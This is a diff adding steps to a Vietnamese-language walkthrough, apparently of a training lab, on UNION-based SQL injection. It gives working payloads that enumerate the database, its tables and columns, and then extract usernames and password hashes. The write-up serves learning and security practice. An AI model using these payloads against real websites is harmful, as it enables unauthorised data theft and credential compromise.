@@ -34,6 +34,35 @@ Bước đầu ta kiểm tra xem có bị lỗi SQLI không bằng gửi payload
 ![Screenshot 2025-05-01 145006](https://github.com/user-attachments/assets/2f4824e1-3d0b-49f0-b53a-3c32301a8922)
 Vậy ta web này đang dính lỗi SQLI cục thể là UNION-based SQL ịnection
 
+Lấy ra database hiện tại
+> aaaa' UNION SELECT 1,database(),2,3-- -
+
+![image](https://github.com/user-attachments/assets/275a74bf-49e1-4aa9-b9fa-0918d41fc04e)
+
+Bây giờ chúng ta cần lấy ra các bản của db vừa tìm được để truy vấn bằng payload như sau
+
+>cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='ilfreight'-- -
+
+![image](https://github.com/user-attachments/assets/404aa435-89b9-4e80-b9a2-d667bdbdf828)
+
+Bây giờ chúng ta lấy ra các cột của bảng bằng payload như sau 
+>cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='users'-- -
+
+![image](https://github.com/user-attachments/assets/79576ff6-e38e-463c-b3e6-7be5eda98c34)
+
+giờ thì chúng ta lấy dữ liệu từ 2 cột username và password bằng payload như sau
+>cn' UNION select 1, username, password, 4 from ilfreight.users-- -
+
+![image](https://github.com/user-attachments/assets/5a22c6b4-5c62-406d-a6bc-76b19f5e7830)
+
+Vậy là chúng ta đã có được mật khẩu băm của newuser
+
+
+
+
+
+
+
 
 
 
